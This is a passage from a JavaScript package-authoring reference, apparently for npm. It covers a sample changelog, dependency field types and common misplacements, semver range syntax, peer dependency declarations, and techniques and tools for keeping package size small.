- New `formatRelative()` function for relative date formatting

### Changed
- Improved performance of `parse()` by 40%

### Fixed
- Timezone offset calculation for DST transitions

## [2.0.0] - 2026-03-15

### Changed
- BREAKING: Renamed `fmt()` to `format()` for clarity
- BREAKING: Minimum Node.js version is now 20

### Removed
- Removed deprecated `legacyParse()` function
```

---

## 10. Dependency Management Reference

### Dependency Types

| Field | Install Command | Published? | Purpose |
|-------|----------------|------------|---------|
| `dependencies` | `npm install <pkg>` | Yes | Required at runtime |
| `devDependencies` | `npm install -D <pkg>` | No | Build tools, test frameworks, linters |
| `peerDependencies` | Manual specification | No (metadata only) | Expected to be provided by consumer |
| `peerDependenciesMeta` | Manual specification | No (metadata only) | Mark peer deps as optional |
| `optionalDependencies` | `npm install -O <pkg>` | Yes | Non-critical, install failure is OK |
| `bundleDependencies` | Manual specification | Yes (bundled in tarball) | Must be included in tarball |

### Common Misplacement Errors

| Package | Wrong Location | Correct Location | Why |
|---------|---------------|-----------------|-----|
| `typescript` | `dependencies` | `devDependencies` | Only needed at build time |
| `react` (in a React lib) | `dependencies` | `peerDependencies` | Consumer provides their own React |
| `@types/*` | `dependencies` | `devDependencies` | Only needed at build/dev time |
| `eslint` | `dependencies` | `devDependencies` | Not needed at runtime |
| `tsup` / `rollup` | `dependencies` | `devDependencies` | Build tool, not runtime |
| `vitest` / `jest` | `dependencies` | `devDependencies` | Test framework, not runtime |

### Version Range Syntax

| Syntax | Meaning | Example | Resolves To |
|--------|---------|---------|-------------|
| `1.2.3` | Exact version | `1.2.3` | Only `1.2.3` |
| `^1.2.3` | Compatible with (minor + patch) | `^1.2.3` | `>=1.2.3 <2.0.0` |
| `~1.2.3` | Approximately (patch only) | `~1.2.3` | `>=1.2.3 <1.3.0` |
| `>=1.2.3` | Greater than or equal | `>=1.2.3` | `1.2.3` and above |
| `1.2.x` | Any patch version | `1.2.x` | `>=1.2.0 <1.3.0` |
| `*` | Any version | `*` | Latest available (dangerous) |
| `1.2.3 - 2.0.0` | Range | `1.2.3 - 2.0.0` | `>=1.2.3 <=2.0.0` |

### Peer Dependency Declaration

```json
{
  "peerDependencies": {
    "react": "^18.0.0 || ^19.0.0",
    "react-dom": "^18.0.0 || ^19.0.0"
  },
  "peerDependenciesMeta": {
    "react-dom": {
      "optional": true
    }
  }
}
```

---

## 11. Package Size Optimization

### Size Budget Guidelines

| Package Type | Minified + Gzipped Target | Notes |
|-------------|--------------------------|-------|
| Utility library | < 5 KB | Tree-shakeable individual exports |
| UI component | < 10 KB | Excluding framework peer deps |
| Full framework | < 50 KB | Entry point, lazy-load features |
| CLI tool | No browser budget | Node-only, size less critical |

### Size Reduction Techniques

| Technique | Impact | Implementation |
|-----------|--------|----------------|
| Tree-shaking | High | `"sideEffects": false` + named exports |
| Minification | Medium | Enable in build tool (`minify: true`) |
| External dependencies | High | Mark peer deps as external in build |
| Code splitting | Medium | Separate entry points per feature |
| Dead code elimination | Medium | Remove unused internal code paths |
| Avoid large dependencies | High | Replace `lodash` with `lodash-es` or native, replace `moment` with `date-fns` |

### Analyzing Package Size

| Tool | Command | What It Shows |
|------|---------|---------------|
| `npm pack --dry-run` | CLI | Files included in tarball |
| `bundlephobia.com` | Web | Minified + gzipped size, download time |
| `packagephobia.com` | Web | Install size (disk space) |
| `size-limit` | `npx size-limit` | Bundle size with CI integration |
| `bundlewatch` | CI integration | Size change tracking per PR |
